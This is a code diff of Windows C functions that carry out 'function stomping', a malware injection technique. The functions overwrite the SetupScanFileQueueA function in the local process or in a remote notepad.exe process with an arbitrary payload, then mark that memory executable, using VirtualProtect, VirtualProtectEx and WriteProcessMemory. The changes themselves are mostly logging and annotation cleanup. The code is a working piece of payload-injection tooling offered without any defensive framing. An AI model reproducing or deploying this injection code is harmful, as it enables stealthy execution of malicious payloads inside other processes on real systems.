@@ -4,55 +4,55 @@
 #pragma comment (lib, "Setupapi.lib") // adding "setupapi.dll" to the import address table
 
 
-BOOL WritePayloadViaFunctionStomping(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
+BOOL WritePayloadViaFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
     *pAddress = &SetupScanFileQueueA;
 	DWORD	dwOldProtection = NULL;
 
 
 	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
-		printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
+		DebugPrint("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
 	memcpy(*pAddress, pPayload, sPayloadSize);
 
 	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
-		printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
+		DebugPrint("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
 	return TRUE;
 }
 
-BOOL WritePayloadViaRemoteFunctionStomping(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
+BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
 	HANDLE		hProcess	= NULL;
     DWORD	dwOldProtection = NULL;
 	DWORD		dwProcessId = NULL;
 	SIZE_T	sNumberOfBytesWritten = NULL;
 
-	DebugPrint("[i] Fucntion stomping into remote process notepad.exe");
+	DebugPrint("[i] Function stomping into remote process notepad.exe\n");
 
-	if (!GetRemoteProcessHandle("notepad.exe", &dwProcessId, &hProcess)) {
-		printf("[!] Process is Not Found \n");
-		return -1;
+	if (!GetRemoteProcessHandle(L"notepad.exe", &dwProcessId, &hProcess)) {
+		DebugPrint("[!] Process is Not Found \n");
+		return FALSE;
 	}
 	DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);
 
 	*pAddress = &SetupScanFileQueueA;
 
 	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
-		printf("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
+		DebugPrint("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
 	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten) {
-		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
-		printf("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
+		DebugPrint("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
+		DebugPrint("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
 		return FALSE;
 	}
 
 	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
-		printf("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
+		DebugPrint("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
